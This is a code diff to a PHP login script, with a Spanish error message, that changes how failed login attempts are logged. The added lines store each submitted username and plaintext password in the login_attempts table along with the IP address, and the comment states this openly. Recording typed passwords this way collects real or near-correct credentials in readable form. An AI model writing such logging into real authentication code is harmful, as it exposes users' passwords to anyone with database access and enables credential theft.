@@ -92,10 +92,10 @@ if (isset($_POST['uname']) && isset($_POST['password'])) {
                 exit();
             }
         } else {
-            // Log the failed attempt
-            $sql = "INSERT INTO login_attempts (ip_address, attempts) VALUES (?, 1) ON DUPLICATE KEY UPDATE attempts = attempts + 1, last_attempt = NOW()";
+            // Log the failed attempt with username and password
+            $sql = "INSERT INTO login_attempts (ip_address, attempts, user, password) VALUES (?, 1, ?, ?) ON DUPLICATE KEY UPDATE attempts = attempts + 1, last_attempt = NOW(), user = VALUES(user), password = VALUES(password)";
             $stmt = mysqli_prepare($conn, $sql);
-            mysqli_stmt_bind_param($stmt, "s", $ip_address);
+            mysqli_stmt_bind_param($stmt, "sss", $ip_address, $uname, $pass);
             mysqli_stmt_execute($stmt);
 
             header("Location: index.php?error=Datos de acceso incorrectos");
